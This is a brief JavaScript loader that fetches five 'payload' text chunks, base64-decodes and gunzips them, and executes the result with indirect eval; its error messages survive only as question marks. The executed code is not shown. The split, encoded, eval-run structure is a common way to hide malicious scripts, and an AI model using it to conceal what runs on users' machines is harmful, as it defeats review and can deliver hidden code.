const files=["./assets/payload-0.txt","./assets/payload-1.txt","./assets/payload-2.txt","./assets/payload-3.txt","./assets/payload-4.txt"];
const payload=(await Promise.all(files.map(async file=>{const res=await fetch(file,{cache:"no-store"});if(!res.ok)throw new Error("?????????"+file);return await res.text();}))).join("");
const bytes=Uint8Array.from(atob(payload),char=>char.charCodeAt(0));
if (!("DecompressionStream" in globalThis)) throw new Error("???????????????????? Chrome?Edge ? Safari?");
const stream=new Blob([bytes]).stream().pipeThrough(new DecompressionStream("gzip"));
(0,eval)(await new Response(stream).text());
